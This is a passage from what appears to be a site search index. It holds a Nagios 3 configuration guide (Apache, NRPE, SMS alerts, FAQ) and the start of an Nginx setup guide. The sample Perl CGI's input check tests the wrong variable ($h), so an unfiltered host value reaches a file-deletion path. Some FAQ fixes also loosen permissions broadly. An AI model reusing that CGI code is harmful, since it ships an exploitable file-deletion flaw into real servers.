/cgi-bin/nagios2 /usr/lib/cgi-bin/nagios3 #ScriptAlias /nagios2/cgi-bin /usr/lib/cgi-bin/nagios3 # Where the stylesheets (config files) reside Alias /nagios3/stylesheets /etc/nagios3/stylesheets # nagios 1.x: #Alias /nagios/stylesheets /etc/nagios3/stylesheets # nagios 2.x: #Alias /nagios2/stylesheets /etc/nagios3/stylesheets # Where the HTML pages live Alias /nagios3 /usr/share/nagios3/htdocs # nagios 2.x: #Alias /nagios2 /usr/share/nagios3/htdocs # nagios 1.x: #Alias /nagios /usr/share/nagios3/htdocs Options FollowSymLinks DirectoryIndex index.php AllowOverride AuthConfig Order Allow,Deny Allow From All AuthName \"Nagios Access\" AuthType Basic AuthUserFile /etc/nagios3/htpasswd.users # nagios 1.x: #AuthUserFile /etc/nagios/htpasswd.users require valid-user # Enable this ScriptAlias if you want to enable the grouplist patch. # See http://apan.sourceforge.net/download.html for more info # It allows you to see a clickable list of all hostgroups in the # left pane of the Nagios web interface # XXX This is not tested for nagios 2.x use at your own peril #ScriptAlias /nagios3/side.html /usr/lib/cgi-bin/nagios3/grouplist.cgi # nagios 1.x: #ScriptAlias /nagios/side.html /usr/lib/cgi-bin/nagios3/grouplist.cgi cgi.cfg linkI’ll spare you all the comments in this file and show you the configuration I use. This is the configuration for the Nagios web interface:\nmain_config_file=/etc/nagios3/nagios.cfg physical_html_path=/usr/share/nagios3/htdocs url_html_path=/nagios3 show_context_help=1 use_pending_states=1 nagios_check_command=/usr/lib/nagios/plugins/check_nagios /var/cache/nagios3/status.dat 5 '/usr/sbin/nagios3' use_authentication=1 use_ssl_authentication=0 authorized_for_system_information=deimos authorized_for_configuration_information=deimos authorized_for_system_commands=deimos authorized_for_all_services=deimos authorized_for_all_hosts=deimos authorized_for_all_service_commands=deimos authorized_for_all_host_commands=deimos default_statusmap_layout=5 default_statuswrl_layout=4 ping_syntax=/bin/ping -n -U -c 5 $HOSTADDRESS$ refresh_rate=90 escape_html_tags=1 action_url_target=_blank notes_url_target=_blank lock_author_names=1 commands.cgi linkThis file allows you to define special commands for specific checks. For example, if you have developed plugins, you will need to create an associated command:\n############################################################################### # COMMANDS.CFG - SAMPLE COMMAND DEFINITIONS FOR NAGIOS ############################################################################### ################################################################################ # NOTIFICATION COMMANDS ################################################################################ # 'notify-host-by-email' command definition define command{ command_name\tnotify-host-by-email command_line\t/usr/bin/printf \"%b\" \"***** Nagios *****\\n\\nNotification Type: $NOTIFICATIONTYPE$\\nHost: $HOSTNAME$\\nState: $HOSTSTATE$\\nAddress: $HOSTADDRESS$\\nInfo: $HOSTOUTPUT$\\n\\nDate/Time: $LONGDATETIME$\\n\" | /usr/bin/mail -s \"** $NOTIFICATIONTYPE$ Host Alert: $HOSTNAME$ is $HOSTSTATE$ **\" $CONTACTEMAIL$ } # 'notify-service-by-email' command definition define command{ command_name\tnotify-service-by-email command_line\t/usr/bin/printf \"%b\" \"***** Nagios *****\\n\\nNotification Type: $NOTIFICATIONTYPE$\\n\\nService: $SERVICEDESC$\\nHost: $HOSTALIAS$\\nAddress: $HOSTADDRESS$\\nState: $SERVICESTATE$\\n\\nDate/Time: $LONGDATETIME$\\n\\nAdditional Info:\\n\\n$SERVICEOUTPUT$\" | /usr/bin/mail -s \"** $NOTIFICATIONTYPE$ Service Alert: $HOSTALIAS$/$SERVICEDESC$ is $SERVICESTATE$ **\" $CONTACTEMAIL$ } ################################################################################ # HOST CHECK COMMANDS ################################################################################ # On Debian, check-host-alive is being defined from within the # nagios-plugins-basic package ################################################################################ # PERFORMANCE DATA COMMANDS ################################################################################ # 'process-host-perfdata' command definition define command{ command_name\tprocess-host-perfdata command_line\t/usr/bin/printf \"%b\" \"$LASTHOSTCHECK$\\t$HOSTNAME$\\t$HOSTSTATE$\\t$HOSTATTEMPT$\\t$HOSTSTATETYPE$\\t$HOSTEXECUTIONTIME$\\t$HOSTOUTPUT$\\t$HOSTPERFDATA$\\n\" \u003e\u003e /var/lib/nagios3/host-perfdata.out } # 'process-service-perfdata' command definition define command{ command_name\tprocess-service-perfdata command_line\t/usr/bin/printf \"%b\" \"$LASTSERVICECHECK$\\t$HOSTNAME$\\t$SERVICEDESC$\\t$SERVICESTATE$\\t$SERVICEATTEMPT$\\t$SERVICESTATETYPE$\\t$SERVICEEXECUTIONTIME$\\t$SERVICELATENCY$\\t$SERVICEOUTPUT$\\t$SERVICEPERFDATA$\\n\" \u003e\u003e /var/lib/nagios3/service-perfdata.out } htpasswd.users linkHere is the htpasswd for Nagios. To change the default nagiosadmin login, do:\nhtpasswd -c htpasswd.users deimos Replace “deimos” with the user you want. Be careful though, this will create a blank file and create this single user.\nnagios.cfg linkThis is the Nagios server configuration, but not the configuration of hosts and services:\nlog_file=/var/log/nagios3/nagios.log cfg_file=/etc/nagios3/commands.cfg cfg_dir=/etc/nagios-plugins/config cfg_dir=/etc/nagios3/conf.d object_cache_file=/var/cache/nagios3/objects.cache precached_object_file=/var/lib/nagios3/objects.precache resource_file=/etc/nagios3/resource.cfg status_file=/var/cache/nagios3/status.dat status_update_interval=10 nagios_user=nagios nagios_group=nagios check_external_commands=1 command_check_interval=-1 command_file=/var/lib/nagios3/rw/nagios.cmd external_command_buffer_slots=4096 lock_file=/var/run/nagios3/nagios3.pid temp_file=/var/cache/nagios3/nagios.tmp temp_path=/tmp event_broker_options=-1 log_rotation_method=d log_archive_path=/var/log/nagios3/archives use_syslog=1 log_notifications=1 log_service_retries=1 log_host_retries=1 log_event_handlers=1 log_initial_states=0 log_external_commands=1 log_passive_checks=1 service_inter_check_delay_method=s max_service_check_spread=30 service_interleave_factor=s host_inter_check_delay_method=s max_host_check_spread=30 max_concurrent_checks=0 check_result_reaper_frequency=10 max_check_result_reaper_time=30 check_result_path=/var/lib/nagios3/spool/checkresults max_check_result_file_age=3600 cached_host_check_horizon=15 cached_service_check_horizon=15 enable_predictive_host_dependency_checks=1 enable_predictive_service_dependency_checks=1 soft_state_dependencies=0 auto_reschedule_checks=0 auto_rescheduling_interval=30 auto_rescheduling_window=180 sleep_time=0.25 service_check_timeout=60 host_check_timeout=30 event_handler_timeout=30 notification_timeout=30 ocsp_timeout=5 perfdata_timeout=5 retain_state_information=1 state_retention_file=/var/lib/nagios3/retention.dat retention_update_interval=60 use_retained_program_state=1 use_retained_scheduling_info=1 retained_host_attribute_mask=0 retained_service_attribute_mask=0 retained_process_host_attribute_mask=0 retained_process_service_attribute_mask=0 retained_contact_host_attribute_mask=0 retained_contact_service_attribute_mask=0 interval_length=60 check_for_updates=1 bare_update_check=0 use_aggressive_host_checking=0 execute_service_checks=1 accept_passive_service_checks=1 execute_host_checks=1 accept_passive_host_checks=1 enable_notifications=1 enable_event_handlers=1 process_performance_data=0 obsess_over_services=0 obsess_over_hosts=0 translate_passive_host_checks=0 passive_host_checks_are_soft=0 check_for_orphaned_services=1 check_for_orphaned_hosts=1 check_service_freshness=1 service_freshness_check_interval=60 check_host_freshness=0 host_freshness_check_interval=60 additional_freshness_latency=15 enable_flap_detection=1 low_service_flap_threshold=5.0 high_service_flap_threshold=20.0 low_host_flap_threshold=5.0 high_host_flap_threshold=20.0 date_format=iso8601 p1_file=/usr/lib/nagios3/p1.pl enable_embedded_perl=1 use_embedded_perl_implicitly=1 illegal_object_name_chars=`~!$%^\u0026*|'\"\u003c\u003e?,()= illegal_macro_output_chars=`~$\u0026|'\"\u003c\u003e use_regexp_matching=0 use_true_regexp_matching=0 admin_email=root@localhost admin_pager=pageroot@localhost daemon_dumps_core=0 use_large_installation_tweaks=0 enable_environment_macros=1 debug_level=0 debug_verbosity=1 debug_file=/var/log/nagios3/nagios.debug max_debug_file_size=1000000 resource.cfg link ... # Sets $USER1$ to be the path to the plugins $USER1$=/usr/lib/nagios/plugins ... conf.d/contacts.cfg linkContacts are used to define contacts and contact groups:\ndefine contact{ contact_name deimos alias Deimos service_notification_period 24x7 host_notification_period 24x7 service_notification_options w,u,c,r host_notification_options d,r service_notification_commands notify-service-by-email host_notification_commands notify-host-by-email email xxx@mycompany.com } define contactgroup{ contactgroup_name admins alias Nagios Administrators members deimos } conf.d/custom-commands.cfg linkI mentioned custom commands earlier. Here’s one I created to test MySQL replication. This will allow me to launch replication via the check_mysqlrep command:\n############################## # CUSTOM NAGIOS COMMANDS # ############################## define command{ command_name\tcheck_mysqlrep command_line\t/usr/lib/nagios/plugins/check_mysql -H $HOSTADDRESS$ -u $ARG1$ -p $ARG2$ -w $ARG3$ -c $ARG4$ -S } conf.d/generic-host.cfg linkThis file is used to provide the generic configuration for hosts, notification intervals, etc… I’ll let you look at the official documentation:\n# Generic host definition template - This is NOT a real host, just a template! define host{ name generic-host ; The name of this host template notifications_enabled 1 ; Host notifications are enabled event_handler_enabled 1 ; Host event handler is enabled flap_detection_enabled 1 ; Flap detection is enabled failure_prediction_enabled 1 ; Failure prediction is enabled process_perf_data 1 ; Process performance data retain_status_information 1 ; Retain status information across program restarts retain_nonstatus_information 1 ; Retain non-status information across program restarts check_command check-host-alive max_check_attempts 10 notification_interval 0 notification_period 24x7 notification_options d,u,r contact_groups admins register 0 ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL HOST, JUST A TEMPLATE! _PROCWARN 150 _PROCCRIT 200 } conf.d/generic_service.cfg linkThis file is used to provide the generic configuration for services, notification intervals, etc… I’ll let you look at the official documentation:\ndefine service{ name generic-service ; The 'name' of this service template active_checks_enabled 1 ; Active service checks are enabled passive_checks_enabled 1 ; Passive service checks are enabled/accepted parallelize_check 1 ; Active service checks should be parallelized (disabling this can lead to major performance problems) obsess_over_service 1 ; We should obsess over this service (if necessary) check_freshness 0 ; Default is to NOT check service 'freshness' notifications_enabled 1 ; Service notifications are enabled event_handler_enabled 1 ; Service event handler is enabled flap_detection_enabled 1 ; Flap detection is enabled failure_prediction_enabled 1 ; Failure prediction is enabled process_perf_data 1 ; Process performance data retain_status_information 1 ; Retain status information across program restarts retain_nonstatus_information 1 ; Retain non-status information across program restarts notification_interval 0\t; Only send notifications on status change by default. is_volatile 0 check_period 24x7 normal_check_interval 3 retry_check_interval 1 max_check_attempts 3 notification_period 24x7 notification_options w,u,c,r contact_groups admins register 0 ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL SERVICE, JUST A TEMPLATE! } conf.d/timeperiods.cfg linkThis file is used to define templates for notification periods:\n############################################################################### # timeperiods.cfg ############################################################################### # This defines a timeperiod where all times are valid for checks, # notifications, etc. The classic \"24x7\" support nightmare. :-) define timeperiod{ timeperiod_name 24x7 alias 24 Hours A Day, 7 Days A Week sunday 00:00-24:00 monday 00:00-24:00 tuesday 00:00-24:00 wednesday 00:00-24:00 thursday 00:00-24:00 friday 00:00-24:00 saturday 00:00-24:00 } # Here is a slightly friendlier period during work hours define timeperiod{ timeperiod_name workhours alias Standard Work Hours monday 09:00-17:00 tuesday 09:00-17:00 wednesday 09:00-17:00 thursday 09:00-17:00 friday 09:00-17:00 } # The complement of workhours define timeperiod{ timeperiod_name nonworkhours alias Non-Work Hours sunday 00:00-24:00 monday 00:00-09:00,17:00-24:00 tuesday 00:00-09:00,17:00-24:00 wednesday 00:00-09:00,17:00-24:00 thursday 00:00-09:00,17:00-24:00 friday 00:00-09:00,17:00-24:00 saturday 00:00-24:00 } # This one is a favorite: never :) define timeperiod{ timeperiod_name never alias Never } # end of file conf.d/hostgroups/unix-srv.cfg linkHere is an example configuration for a hostgroup. You will then simply associate a host with this hostgroup to inherit all the services described below:\n# Some generic hostgroup definitions define hostgroup { hostgroup_name unix-srv alias Unix servers } # Define a service to check the disk space of the root partition # on the local machine. Warning if \u003c 20% free, critical if # \u003c 10% free space on partition. define service{ use generic-service hostgroup_name unix-srv service_description Disk Space check_command check_nrpe!check_all_disks!20%!10% } # Define a service to check the number of currently logged in # users on the local machine. Warning if \u003e 20 users, critical # if \u003e 50 users. define service{ use generic-service ; Name of service template to use hostgroup_name unix-srv service_description Current Users check_command check_nrpe!check_users!2!3 } # Define a service to check the number of currently running procs # on the local machine. Warning if \u003e 250 processes, critical if # \u003e 400 processes. define service{ use generic-service ; Name of service template to use hostgroup_name unix-srv service_description Total Processes check_command check_nrpe!check_procs!$_HOSTPROCWARN$!$_HOSTPROCCRIT$ } # Check Zombie process define service{ use generic-service ; Name of service template to use hostgroup_name unix-srv service_description Zombie Processes check_command check_nrpe!check_zombie_procs!2!3 } # Define a service to check the load on the local machine. define service{ use generic-service ; Name of service template to use hostgroup_name unix-srv service_description Current Load check_command check_nrpe!check_load!5.0,4.0,3.0!10.0,6.0,4.0 } # check that ssh services are running define service{ use generic-service hostgroup_name unix-srv service_description SSH Servers check_command check_ssh } conf.d/hosts/serveur.cfg linkAnd here I declare a host and associate unix-srv declared above so it inherits the services above:\ndefine host{ use generic-host host_name server.deimos.fr alias server address server.deimos.fr hostgroups unix-srv _PROCWARN 280 _PROCCRIT 350 } Here I use variables (_PROCWARN and _PROCCRIT) that override the default values (See the documentation for more information). You must add as in the documentation HOST ($_HOSTPROCWARN$ and $_HOSTPROCCRIT$) only for the command declaration part.\nIf you want a more complete configuration, I’ve attached an archive with a more complete Nagios3 configuration: Nagios configuration\nAddons linkNRPE linkWe need to configure the NRPE check to handle multiple arguments. Otherwise, we will be limited to just one. Edit the following file and add the necessary number of arguments:\n# this command runs a program $ARG1$ with arguments $ARG2$ define command { command_name check_nrpe command_line /usr/lib/nagios/plugins/check_nrpe -H $HOSTADDRESS$ -c $ARG1$ -a $ARG2$ $ARG3$ $ARG4$ $ARG5$ $ARG6$ $ARG7$ $ARG8$ $ARG9$ } # this command runs a program $ARG1$ with no arguments define command { command_name check_nrpe_1arg command_line /usr/lib/nagios/plugins/check_nrpe -H $HOSTADDRESS$ -c $ARG1$ } Here I’ve gone up to 9, but if I remember correctly, you can go up to 32 arguments.\nHiding “non-OK” alerts linkThere is a simple solution to avoid displaying certain alerts that are somewhat annoying, such as if like me you have nearly 1500 alerts, a 107cm screen just for Nagios, and some alerts take up too much space and cannot be resolved quickly (e.g., a weekly backup check that failed).\nThe solution is done through the graphical interface by acknowledging the services you no longer want to see. This way, they will be hidden and when they return to OK, they will be displayed again and the acknowledgement will disappear.\nThen in your browser URL, you’ll need to modify it a bit to ask it not to display acknowledged alerts. By looking through the CGI sources, you can find this kind of information:\ngrep SERVICE_ include/cgiutils.h.in #define SERVICE_SCHEDULED_DOWNTIME\t1 #define SERVICE_NO_SCHEDULED_DOWNTIME\t2 #define SERVICE_STATE_ACKNOWLEDGED\t4 #define SERVICE_STATE_UNACKNOWLEDGED\t8 #define SERVICE_CHECKS_DISABLED\t16 #define SERVICE_CHECKS_ENABLED\t32 #define SERVICE_EVENT_HANDLER_DISABLED\t64 #define SERVICE_EVENT_HANDLER_ENABLED\t128 #define SERVICE_FLAP_DETECTION_ENABLED\t256 #define SERVICE_FLAP_DETECTION_DISABLED\t512 #define SERVICE_IS_FLAPPING\t1024 #define SERVICE_IS_NOT_FLAPPING\t2048 #define SERVICE_NOTIFICATIONS_DISABLED\t4096 #define SERVICE_NOTIFICATIONS_ENABLED\t8192 #define SERVICE_PASSIVE_CHECKS_DISABLED\t16384 #define SERVICE_PASSIVE_CHECKS_ENABLED\t32768 #define SERVICE_PASSIVE_CHECK 65536 #define SERVICE_ACTIVE_CHECK 131072 #define SERVICE_HARD_STATE\t262144 #define SERVICE_SOFT_STATE\t524288 PS: I took these lines from Nagios 3 sources; there are a few less things for versions 2 and 1.\nHere is an example URL with the correspondences:\nhttp://nagioshost/cgi-bin/nagios3/status.cgi?host=all\u0026servicestatustypes=28\u0026serviceprops=8 servicestatustypes=28: all states except OK serviceprops=8: Removes acknowledged states And a little bonus now, if you want to hide the information summary at the top of the page (hide the header), here’s the ‘\u0026noheader’ option:\nhttp://nagioshost/cgi-bin/nagios3/status.cgi?host=all\u0026servicestatustypes=28\u0026serviceprops=8\u0026noheader Adding a custom CGI linkIn some cases, you may have certain checks that temporarily store information on the Nagios server and you want to be able to execute actions from the Nagios interface. For this, there’s the ‘action_url’ option where we can give a URL to a CGI that will execute what we want, perhaps with options.\nTo start, we’ll create our CGI. Here’s a minimalist example where I delete a temporary file:\n#!/usr/bin/perl use CGI; $query = CGI::new(); $host = $query-\u003eparam(\"host\"); # Avoid inputing special characters that would crash the program if ( $h =~ /\\`|\\~|\\@|\\#|\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\:|\\=|\\+|\\\"|\\'|\\;|\\\u003c|\\\u003e/ ) { print \"Illegal special chars detected. Exit\\n\"; exit(1); } print \"Content-type: text/html\\n\\n\"; print \"\\n\"; print \"Removing $host temporary file\\n\"; print \"\\n\"; print \"\\n\"; print \"Removing $host Interface Network Flapping temporary file...\"; if (-f \"/tmp/iface_state_$host.txt\") { unlink(\"/tmp/iface_state_$host.txt\") or print \"FAIL\n/tmp/iface_state_$host.txt: $!\\n\" and exit(1); print \"OK\\n\"; } else { print \"FAIL\n/tmp/iface_state_$host.txt: No such file or directory\\n\"; } print \"\\n\"; And then in the configuration of the service in question, I insert my ‘action_url’:\ndefine service{ use generic-services-ulsysnet hostgroup_name network service_description Interface Network Flapping check_period 24x7 notification_period 24x7 _SNMP_PORT\t161 _SNMP_COMMUNITY\tpublic _DURATION\t86400 check_command check_interface_flapping # For Thruk \u0026 Nagios # action_url\t../../cgi-bin/nagios3/remove.cgi?host=$HOSTADDRESS$ # For Nagios only action_url\tremove.cgi?host=$HOSTADDRESS$ } All you have to do now is reload Nagios.\nSending SMS alerts via Free Mobile linkThanks to Free Mobile for offering the possibility to send SMS via an API (which can be activated from the web interface of your account). How does it work? Simply create a scripts folder in the configuration folder and put the content of this script in it:\n#!/bin/bash message=\"$(perl -MURI::Escape -e 'print uri_escape($ARGV[0]);' \"Naemon $1: $2 on $3 $4 ($5)\")\" curl --insecure \"https://smsapi.free-mobile.fr/sendmsg?user=\u0026pass=\u0026msg=$message\" Adapt the ‘userid’ and ‘password’ fields with your personal settings (these credentials are available from the Free Mobile web interface). Now create the associated contacts and contactgroups:\ndefine contact { contact_name oncall-sms ; Short name of user alias oncall-sms ; Full name of user use contact-sms ; Inherit default values from generic-contact template (defined above) } define contactgroup { contactgroup_name admins-sms alias Nagios Administrators SMS members oncall-sms } Add the necessary commands that can call the script:\n# 'notify-host-by-sms' command definition define command { command_name notify-host-by-sms command_line /etc/naemon/scripts/send_sms.sh $SHORTDATETIME$ $NOTIFICATIONTYPE$ $HOSTNAME$/$SERVICEDESC$ $HOSTSTATE$ $HOSTOUTPUT$ } # 'notify-service-by-sms' command definition define command { command_name notify-service-by-sms command_line /etc/naemon/scripts/send_sms.sh $SHORTDATETIME$ $NOTIFICATIONTYPE$ $HOSTNAME$/$SERVICEDESC$ $SERVICESTATE$ $SERVICEOUTPUT$ } define contact { name contact-sms ; The name of this contact template host_notification_commands notify-host-by-sms ; send host notifications via email host_notification_options d,u,r ; send notifications for all host states, flapping events, and scheduled downtime events host_notification_period 24x7 ; host notifications can be sent anytime register 0 ; DONT REGISTER THIS DEFINITION - ITS NOT A REAL CONTACT, JUST A TEMPLATE! service_notification_commands notify-service-by-sms ; send service notifications via email service_notification_options u,c,r ; send notifications for all service states, flapping events, and scheduled downtime events service_notification_period 24x7 ; service notifications can be sent anytime } And finally the service escalation, to notify everyone by SMS if there hasn’t been action taken quickly enough:\ndefine serviceescalation { host_name * service_description * first_notification 3 last_notification 4 notification_interval 0 contact_groups admins,admins-sms } Of course, this is just an example, and you will certainly need to adapt it to your needs.\nFAQ linkNo output returned from plugin linkSolution 1 linkIf you encounter this type of error, it’s because you haven’t activated the arguments in the NRPE configuration. In the NRPE configuration file /etc/nagios/nrpe.cfg, change this value:\ndont_blame_nrpe=0 to 1:\ndont_blame_nrpe=1 Then restart NRPE and you’re good to go :-)\nSolution 2 linkI had this problem and searched for a while before finding the solution. It comes from NRPE and for the host’s configuration in question, replace something like this:\ncheck_nrpe!check_disk_c with\ncheck_nrpe_1arg!check_disk_c The difference is that:\ncheck_nrpe: takes arguments check_nrpe_1arg: takes no arguments Error: Could not stat() command file ‘/var/lib/nagios3/rw/nagios.cmd’! linkSolution 1 linkThis kind of error exists simply because you don’t have the permissions, so to solve this problem:\nchmod -Rf a+rx /var/lib/nagios3 Or:\nchown nagios.www-data /var/lib/nagios3/rw/nagios.cmd Solution 2 linkUsually a permissions issue on Debian, here’s the solution! Execute these commands as root:\ndpkg-statoverride --update --add nagios www-data 2710 /var/lib/nagios3/rw dpkg-statoverride --update --add nagios nagios 751 /var/lib/nagios3 chmod -Rf a+rx /var/lib/nagios3 chown nagios.www-data /var/lib/nagios3/rw/nagios.cmd I am not receiving emails linkYou need to check if the mail command is present in command.cfg and especially with the correct PATH. For example with Debian, I encountered a small problem and this simple symbolic link solved the problem:\nln -s /usr/bin/mail /bin/mail return code of 127 is out of bounds linkThis is probably due to a permission error (plugin execution) or because you are not indicating the complete path of the executable you want to launch. Forget $USER1$, it doesn’t work very well for me. After a few Nagios reloads, it starts to malfunction, so use the full path.\nCHECK_NRPE: Error - Could not complete SSL handshake. linkI bet it’s because you don’t have the permissions! A small telnet on port 5666 of your server will tell you a lot. Then modify the allowed_hosts line of nrpe.cfg and everything should be back in order :-)\nMonitoring Wordpress linkWordpress has a small peculiarity with check_http, which is that you need to make it follow links (option “follow”). Here’s an example check:\ndefine command{ command_name check_blog command_line /usr/lib/nagios/plugins/check_http -H 'www.deimos.fr' -u '/blog/index.php' -s 'Parce que la mémoire humaine ne fait pas des Go' -f follow } You don’t have permission to access /nagios3/ on this server linkIf like me after a Debian update (5 -\u003e 6) you have this message, you need to replace “index.html” with “index.php”:\n... DirectoryIndex index.php ... Then restart the service:\n/etc/init.d/apache2 restart My pending checks are still there even after a reboot linkIt’s possible to have issues on your Nagios machine and the checks that need to be done remain active, even after a reboot. This is simply because Nagios keeps them in memory to be able to re-execute them later. To purge this queue, modify this in the Nagios configuration, restart it, then change the parameter back to 1:\n[...] retain_state_information=0 [...] Resources linkNagios Documentation on OpenBSD\nhttps://www.mail-archive.com/nagios-users@lists.sourceforge.net/msg04394.html\nNagios Documentation\n"
            }
        );
    index.add(
            {
                id:  168 ,
                href: "\/Nginx_:_Installation_et_configuration_d\u0027une_alternative_d\u0027Apache\/",
                title: "Nginx: Installation and Configuration as an Apache Alternative",
                description: "A comprehensive guide to installing and configuring Nginx as an alternative to Apache, including various optimizations and application configurations.",
                content: " Software version 1.2.1 Operating System Debian 7 Website Nginx Website Last Update 29/08/2014 Introduction linkNginx [engine x] is a web server (or HTTP) software written by Igor Sysoev, whose development began in 2002 for the needs of a high-traffic Russian site.\nI’ve been looking for an alternative to Apache for some time because it’s too resource-hungry. When discovering lighttpd, I realized that other servers existed besides Apache and IIS. It was time to dig deeper into this question.\nInstallation linkFor the installation on Debian, it’s always simple:\naptitude install nginx Then we’ll start it:\n/etc/init.d/nginx start Configuration linkphp-fpm linkThis is the most optimal solution for multi-threaded machines (i.e., several cores).\nInstallation link aptitude install php5-fpm Configuration linkFor the configuration, we will create a basic configuration (if possible, delete the default configuration). We will change it later, but this gives you an idea of a minimal working configuration:\nserver { listen 80; server_name www.deimos.fr; root /var/www/deimos.fr; index index.html index.htm index.php; location ~ \\.php$ { fastcgi_index index.php; fastcgi_pass unix:/var/run/php5-fpm.sock; # fastcgi_pass 127.0.0.1:9000; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } We will change the listening type from TCP to sockets:\n; The address on which to accept FastCGI requests. ; Valid syntaxes are: ; 'ip.add.re.ss:port' - to listen on a TCP socket to a specific address on ; a specific port; ; 'port' - to listen on a TCP socket to all addresses on a ; specific port; ; '/path/to/unix/socket' - to listen on a unix socket. ; Note: This value is mandatory. listen = /var/run/php5-fpm.sock Then apply the configuration:\nln -s /etc/nginx/sites-available/www.deimos.fr /etc/nginx/sites-enabled/www.deimos.fr Then restart php-fpm and nginx!\nPHP-FPM Status linkIf you need to monitor PHP-FPM, you’ll certainly need information about your PHP-FPM. For this, edit the following file and uncomment these lines:\n[...] pm.status_path = /fpm-status [...] Then edit your Nginx configuration and add:\n[...] # PHP-FPM Status location /fpm-status { include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; # User access auth_basic \"Please logon\"; auth_basic_user_file /etc/nginx/access/htaccess; } [...] To prevent anyone from accessing it, I’ve placed a htaccess, but you can choose the security method you prefer.\nRestart PHP-FPM and Nginx, then access your server like this:\nhttp://server/fpm-status: general information http://server/fpm-status?full: detailed general information http://server/fpm-status?json\u0026full: json export http://server/fpm-status?html\u0026full: html export http://server/fpm-status?xml\u0026full: xml export This will give you something like this in the non-detailed version:\npool: www process manager: dynamic start time: 18/Dec/2013:19:00:41 +0100 start since: 52972 accepted conn: 5268 listen queue: 0 max listen queue: 0 listen queue len: 0 idle processes: 3 active processes: 1 total processes: 4 max active processes: 4 max children reached: 0 PHP Fast CGI linkThis method works but is not optimal. Use php-fpm if you can.\nInstallation linkTo make Nginx support PHP, we’ll install:\naptitude install php5-cgi Then we will create an init service for this fast cgi:\n#! /bin/sh ### BEGIN INIT INFO # Provides: php-fcgi # Required-Start: $all # Required-Stop: $all # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: Start and stop php-cgi in external FASTCGI mode # Description: Start and stop php-cgi in external FASTCGI mode ### END INIT INFO # Author: Kurt Zankl # Modified by Deimos # Do NOT \"set -e\" BIND=127.0.0.1:9000 USER=www-data PHP_FCGI_CHILDREN=15 PHP_FCGI_MAX_REQUESTS=1000 PATH=/usr/bin:/sbin:/usr/sbin:/bin PHP_CGI=/usr/bin/php-cgi PHP_CGI_NAME=`basename $PHP_CGI` PHP_CGI_ARGS=\"- USER=$USER PATH=$PATH PHP_FCGI_CHILDREN=$PHP_FCGI_CHILDREN PHP_FCGI_MAX_REQUESTS=$PHP_FCGI_MAX_REQUESTS $PHP_CGI -b $BIND\" RETVAL=0 # Load the VERBOSE setting and other rcS variables . /lib/init/vars.sh # Define LSB log_* functions. # Depend on lsb-base (\u003e= 3.0-6) to ensure that this file is present. . /lib/lsb/init-functions do_start() { echo -n \"Starting PHP FastCGI : \" start-stop-daemon --start --quiet --background --chuid \"$USER\" --exec /usr/bin/env -- $PHP_CGI_ARGS RETVAL=$? echo \"$PHP_CGI_NAME.\" } do_stop() { echo -n \"Stopping PHP FastCGI : \" killall -q -w -u $USER $PHP_CGI RETVAL=\"$?\" echo \"$PHP_CGI_NAME.\" } case \"$1\" in start) do_start ;; stop) do_stop ;; restart) do_stop do_start ;; *) echo \"Usage: php-fcgi {start|stop|restart}\" exit 3 ;; esac exit $RETVAL Then we will update the default RCs and start everything:\ncd /etc/init.d chmod 755 /etc/init.d/php-fcgi update-rc.d php-fcgi defaults /etc/init.d/php-fcgi start Configuration linkTo configure PHP support, edit the base Nginx file and adapt:\nserver { listen 80; server_name localhost; access_log /var/log/nginx/localhost.access.log; location / { root /var/www/nginx-default; index index.html index.htm index.php; } location /doc { root /usr/share; autoindex on; allow 127.0.0.1; deny all; } location /images { root /usr/share; autoindex on; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root /var/www/nginx-default; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ { #proxy_pass http://127.0.0.1; #} # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location ~ \\.php$ { root /var/www/nginx-default; include /etc/nginx/fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /var/www/nginx-default/$fastcgi_script_name; } # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\\.ht { #deny all; #} } nginx.conf linkHere is the global server configuration. I added comments on important lines:\nuser www-data; # Number of working process worker_processes 2; worker_rlimit_nofile 2000; pid /var/run/nginx.pid; events { # Maximum connection number worker_connections 2048; use epoll; # multi_accept on; } http { ## # Basic Settings ## sendfile on; tcp_nopush on; tcp_nodelay on; keepalive_timeout 65; types_hash_max_size 2048; map_hash_bucket_size 64; # Security to hide version server_tokens off; server_names_hash_bucket_size 64; # server_name_in_redirect off; # Grow this 2 values if you get 502 error message fastcgi_buffers 256 16k; fastcgi_buffer_size 32k; # Nginx cache to boost performances fastcgi_cache_path /usr/share/nginx/cache levels=1:2 keys_zone=mycache:10m inactive=1h max_size=256m; include /etc/nginx/mime.types; default_type application/octet-stream; ## # Logging Settings ## access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; ## # Gzip Settings ## gzip on; gzip_disable \"msie6\"; gzip_static on; gzip_vary on; gzip_proxied any; gzip_comp_level 6; gzip_buffers 16 8k; gzip_http_version 1.1; gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript; ## # nginx-naxsi config ## # Uncomment it if you installed nginx-naxsi ## #include /etc/nginx/naxsi_core.rules; ## # nginx-passenger config ## # Uncomment it if you installed nginx-passenger ## #passenger_root /usr; #passenger_ruby /usr/bin/ruby; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } drop.conf linkThis file will allow us to not log non-essential information and prevent access to potentially sensitive files:\n# Do not log robots.txt if not found location = /robots.txt { access_log off; log_not_found off; } # Do not log favicon.ico if not found location = /favicon.ico { access_log off; log_not_found off; } # Do not give access to hidden files location ~ /\\. { access_log off; log_not_found off; deny all; } # Do not give access to vim backuped files location ~ ~$ { access_log off; log_not_found off; deny all; } Then in your configuration files, just add these 2 lines:\nserver { [...] # Drop config include drop.conf; } VirtualHosts linkJust like with Apache, you can create virtual hosts. For example, let’s create the deimos.fr blog:\nserver { listen 80; server_name blog.deimos.fr; access_log /var/log/nginx/localhost.access.log; location / { root 